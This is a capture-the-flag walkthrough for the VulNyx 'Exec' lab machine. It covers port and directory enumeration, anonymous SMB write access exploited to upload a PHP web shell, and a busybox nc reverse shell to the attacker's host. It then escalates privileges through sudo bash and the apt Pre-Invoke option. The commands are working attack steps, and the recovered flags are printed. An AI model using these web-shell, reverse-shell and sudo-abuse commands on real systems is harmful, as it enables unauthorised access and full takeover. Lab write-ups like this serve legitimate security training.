# VulNyx - Exec

## Information

## Solution

### Enumeration
#### Nmap 
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 192.168.11.21
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-07 12:29 +07
Nmap scan report for 192.168.11.21
Host is up (0.00090s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp  open  http        Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 08:00:27:9D:05:F0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-05-07T05:30:13
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 3s
|_nbstat: NetBIOS name: EXEC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.44 seconds
```
#### Gobuster
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://192.168.11.21/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.11.21/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 278]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```

### Shell (www-data)
#### List
Enumeration Samba shares.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ smbclient -L //192.168.11.21 -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        server          Disk      Developer Directory
        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
        nobody          Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 192.168.11.21 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

Enumerate the SMB shares on machine 192.168.11.21 using an Anonymous account (Null Session).
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ netexec smb 192.168.11.21 -u '' -p '' --shares
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder protocols
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Creating missing folder logs/sam
[*] Creating missing folder logs/lsa
[*] Creating missing folder logs/ntds
[*] Creating missing folder logs/dpapi
[*] Creating default workspace
[*] Initializing MSSQL protocol database
[*] Initializing VNC protocol database
[*] Initializing SSH protocol database
[*] Initializing LDAP protocol database
[*] Initializing SMB protocol database
[*] Initializing FTP protocol database
[*] Initializing WMI protocol database
[*] Initializing NFS protocol database
[*] Initializing RDP protocol database
[*] Initializing WINRM protocol database
[*] Copying default configuration file
SMB         192.168.11.21   445    EXEC             [*] Unix - Samba (name:EXEC) (domain:EXEC) (signing:False) (SMBv1:False)
SMB         192.168.11.21   445    EXEC             [+] EXEC\: 
SMB         192.168.11.21   445    EXEC             [*] Enumerated shares
SMB         192.168.11.21   445    EXEC             Share           Permissions     Remark                                                                                
SMB         192.168.11.21   445    EXEC             -----           -----------     ------                                                                                
SMB         192.168.11.21   445    EXEC             print$                          Printer Drivers                                                                       
SMB         192.168.11.21   445    EXEC             server          READ,WRITE      Developer Directory                                                                   
SMB         192.168.11.21   445    EXEC             IPC$                            IPC Service (Samba 4.17.12-Debian)                                                    
SMB         192.168.11.21   445    EXEC             nobody                          Home Directories                              
```
**Share** servers allow anonymous users (no account required) to both READ and WRITE.

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ smbclient //192.168.11.21/server -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu May  7 14:30:34 2026
  ..                                  D        0  Mon Apr 15 15:04:12 2024
  index.html                          N    10701  Mon Apr 15 15:04:31 2024

                19480400 blocks of size 1024. 16478012 blocks available
```
WE tried uploading a PHP file called `exploit.php` using the put command and it was successful.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ echo '<?php system($_GET["cmd"]); ?>' > exploit.php
```
```bash
smb: \> put exploit.php
putting file exploit.php as \exploit.php (2.3 kB/s) (average 2.3 kB/s)
smb: \> ls
  .                                   D        0  Thu May  7 14:41:24 2026
  ..                                  D        0  Mon Apr 15 15:04:12 2024
  index.html                          N    10701  Mon Apr 15 15:04:31 2024
  exploit.php                         A       31  Thu May  7 14:41:24 2026

                19480400 blocks of size 1024. 16478008 blocks available

```

#### Reverse shell
After the upload is successful, access it via the web.
![exploit www-data](/walkthroughs/vulnyx/low-difficulty/24_exec/exploit-web.png)

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -sX GET "http://192.168.11.21/exploit.php?cmd=busybox%20nc%20192.168.11.10%204444%20-e%20sh"
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.11.10] from (UNKNOWN) [192.168.11.21] 34956
id ; hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
exec
which python
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@exec:/var/www/html$ 
```
### Shell (s3cur4)
#### Enumeration
```bash
www-data@exec:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on exec:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on exec:
    (s3cur4) NOPASSWD: /usr/bin/bash
```
#### Abuse
```bash
www-data@exec:/var/www/html$ sudo -u s3cur4 /usr/bin/bash
sudo -u s3cur4 /usr/bin/bash
s3cur4@exec:/var/www/html$ id ; hostname
id ; hostname
uid=1000(s3cur4) gid=1000(s3cur4) groups=1000(s3cur4)
exec
```

### Privilege Escalation
#### Enumeration
```bash
s3cur4@exec:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for s3cur4 on exec:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User s3cur4 may run the following commands on exec:
    (root) NOPASSWD: /usr/bin/apt
```
#### Abuse
![shell root](/walkthroughs/vulnyx/low-difficulty/24_exec/reverse-shell.png)

```bash
s3cur4@exec:/var/www/html$ sudo -u root /usr/bin/apt update -o APT::Update::Pre-Invoke::=/bin/sh
<bin/apt update -o APT::Update::Pre-Invoke::=/bin/sh
# id ; hostname
id ; hostname
uid=0(root) gid=0(root) groups=0(root)
exec
```

#### Flags
```bash
# find / -name root.txt -o -name user.txt 2>/dev/null |xargs cat
find / -name root.txt -o -name user.txt 2>/dev/null |xargs cat
97d8adddb3a3aa8b63e28c2396c5e53f
45e398cc820ab08df0e3a414eac58fef
```

***You are welcome!***
